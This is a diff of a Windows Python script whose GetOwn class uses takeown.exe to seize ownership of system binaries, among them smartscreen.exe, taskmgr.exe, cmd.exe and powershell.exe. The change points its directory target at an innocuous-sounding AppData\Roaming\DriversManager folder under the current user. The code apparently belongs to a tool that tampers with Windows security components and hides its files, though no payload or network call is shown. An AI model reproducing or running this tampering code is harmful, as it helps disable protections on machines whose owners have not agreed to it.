@@ -3,6 +3,7 @@
 import os, sys
 # Get the current letter for System
 letter_drive_path = os.environ["SystemDrive"]
+current_user      = os.environ["USERNAME"]
 
 class GetOwn():
     """ Classe définissant les processus et répertoire à s'approprier """
@@ -10,7 +11,7 @@ class GetOwn():
         self.processus_windir = ["explorer.exe", "notepad.exe"]
         self.processus_pshell = ["powershell.exe", "powershell_ise.exe"]
         self.processus_sysdir = ["taskmgr.exe", "cmd.exe", "smartscreen.exe"]
-        self.directory_check  = ['{} \\PerfLogs {}', '{} \\PerfLogs\\setup {}', '{} \\PerfLogs\\setup\\* {}']
+        self.directory_check  = ["{} {}\\Users\\{}\\AppData\\Roaming\\DriversManager {}"]
         self.processus_exec   = "START /MIN {}\\Windows\\System32\\takeown.exe /F".format(letter_drive_path)
         self.syntax_option    = "/R"
         self.directory3       = "{}\\Windows\\System32\\WindowsPowerShell\\v1.0\\".format(letter_drive_path)
@@ -35,5 +36,5 @@ class GetOwn():
     # Function to get own the directory destination and contains
     def dir(self):
         for x in self.directory_check:
-            self.command_execute = x.format(self.processus_exec, self.syntax_option)
+            self.command_execute = x.format(self.processus_exec, letter_drive_path, current_user, self.syntax_option)
             os.system(self.command_execute)
